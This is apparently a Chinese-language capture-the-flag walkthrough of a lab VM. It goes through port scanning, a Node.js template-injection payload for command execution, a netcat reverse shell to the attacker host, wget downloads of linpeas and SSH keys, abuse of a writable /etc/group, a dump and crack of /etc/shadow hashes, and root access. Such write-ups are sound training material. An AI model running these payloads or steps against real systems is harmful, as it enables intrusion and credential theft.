# **一、信息收集**

首先，在目标网段内使用`arp-scan`进行主机发现，以确定目标的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:72:8f:66       PCS Systemtechnik GmbH
...
```

确定目标IP为 `192.168.205.132` 后，使用`nmap`对其进行全端口扫描，以探测开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 09:47 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:72:8F:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示目标开放了22 (SSH)、80 (HTTP) 和 3000 (PPP, 实际为Web服务) 端口。

# **二、漏洞利用**

访问目标80端口，发现是一个名为 "Safe Welcome Message Processor" 的Web应用。访问3000端口，则是一个功能相似的 "Welcome Message Processor" 应用。

经过测试，发现3000端口的Web应用存在服务器端模板注入（SSTI）漏洞。通过提交payload `<%= 7*7 %>`，服务器成功执行了乘法运算并返回了结果 `49`，确认了漏洞的存在。

![image-20250815215732917](http://7r1UMPHK.github.io/image/20250815224342800.webp)

为了进一步利用此漏洞，构造了一个可以执行系统命令的payload。该payload利用Node.js的`child_process`模块来执行`id`命令，并回显结果。

**命令执行Payload:**

```javascript
<% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('id'); %><%= output %>
```

![image-20250815215910295](http://7r1UMPHK.github.io/image/20250815224346104.webp)

服务器成功返回了`uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)`，表明命令已在目标系统上以`welcome`用户身份执行。

接下来，利用该漏洞获取一个反向shell。首先在Kali攻击机上设置Netcat监听8888端口。

**Kali监听:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

然后，在Web页面提交反弹shell的payload。

**反弹Shell Payload:**

```javascript
<% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('busybox nc 192.168.205.128 8888 -e /bin/bash'); %><%= output %>
```

提交后，成功在Kali上接收到来自目标主机的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 43342
id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

为了获得更好的交互体验，对获取的shell进行稳定化处理。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

在获取了`welcome`用户的shell后，开始进行提权操作。首先，检查用户的`sudo`权限。

```bash
welcome@Temp:/opt/ssti-welcome$ sudo -l
...
User welcome may run the following commands on Temp:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

`sudo -l`结果显示`welcome`用户只能以`NOPASSWD`方式执行`/usr/sbin/reboot`命令，此权限对提权没有直接帮助。

接着，在用户家目录下发现并读取了`user.txt`文件，获得了第一个flag。

```bash
welcome@Temp:~$ cat user.txt
flag{user-12f54a96f64443246930da001cafda8b}
```

为了更全面地收集系统信息，上传并执行`linpeas.sh`脚本进行自动化枚举。

```bash
welcome@Temp:~$ cd /tmp
welcome@Temp:/tmp$ busybox wget 192.168.205.128/linpeas.sh
welcome@Temp:/tmp$ bash /tmp/linpeas.sh
...
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
...
/etc/group
...
```

`linpeas`的扫描结果显示`/etc/group`文件对于当前用户是可写的，这是一个关键的提权向量。我们可以通过修改该文件，将`welcome`用户添加到`sudo`或`shadow`等高权限用户组。

为了能够读取`/etc/shadow`文件以破解用户密码，决定将`welcome`用户添加到`shadow`组。

## **1. 配置SSH免密登录**

由于不知道`welcome`用户的密码，无法直接切换组。因此，首先配置SSH免密登录，以便在修改`/etc/group`后能以新组的身份重新登录。

在`welcome`用户家目录下创建`.ssh`目录，并从Kali攻击机下载`authorized_keys`文件。

```bash
welcome@Temp:~$ mkdir .ssh
welcome@Temp:~$ cd .ssh/
welcome@Temp:~/.ssh$ busybox wget 192.168.205.128/authorized_keys
```

## **2. 修改`/etc/group`**

使用`vim`或其他编辑器打开`/etc/group`文件，将`welcome`用户添加到`shadow`组和`sudo`组。

```bash
welcome@Temp:~/.ssh$ vim /etc/group
```

修改后的内容如下：

```
...
sudo:x:27:welcome
...
shadow:x:42:welcome
...
```

## **3. 读取shadow文件并破解密码**

修改完成后，从Kali攻击机通过SSH连接到目标，此时`welcome`用户已具备`shadow`组的权限，可以直接读取`/etc/shadow`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh welcome@192.168.205.132
...
welcome@Temp:~$ cat /etc/shadow
root:$6$OJ3tCiDX7okU1mml$K5.VqI9J/kSkDxb.et6AWCJnfN0//2VmsjZlwdBCeDK2MgHpojEVMs7hd3FAuQ1EYIJpHnUMMR.pz3uQvpzGr1:20293:0:99999:7:::
...
welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.:20293:0:99999:7:::
```

将`welcome`用户的密码哈希保存下来，使用`John the Ripper`和`rockyou.txt`字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.' > hash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
sainsburys       (welcome)
...
Session completed.
```

成功破解出`welcome`用户的密码为 `sainsburys`。

## **4. 获取Root权限**

由于之前已将`welcome`用户添加到了`sudo`组，现在可以直接使用破解出的密码切换到root用户。

```bash
welcome@Temp:~$ sudo bash
[sudo] password for welcome: sainsburys
root@Temp:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取root权限后，读取`/root/root.txt`和`/home/welcome/user.txt`，获得所有flag。

```bash
root@Temp:/home/welcome# cat /root/root.txt /home/welcome/user.txt
flag{root-60b725f10c9c85c70d97880dfe8191b3}
flag{user-12f54a96f64443246930da001cafda8b}
```

